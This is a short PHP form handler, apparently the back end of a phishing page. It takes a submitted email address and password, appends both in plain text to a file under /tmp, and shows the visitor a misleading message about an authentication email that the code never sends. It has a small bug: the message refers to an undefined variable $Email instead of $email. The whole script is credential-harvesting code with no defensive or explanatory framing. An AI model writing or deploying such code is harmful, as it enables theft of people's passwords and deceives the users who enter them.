<?php
  $email = $_POST["email"];
$password = $_POST["password"];
$file="/tmp/basic-auth.dat";
$data = "$email:$password\n";
file_put_contents($file, $data, FILE_APPEND );
echo "<div class='message'>Email Address Submitted, if needed you should shortly receive an authentication email at $Email</div>";
?>
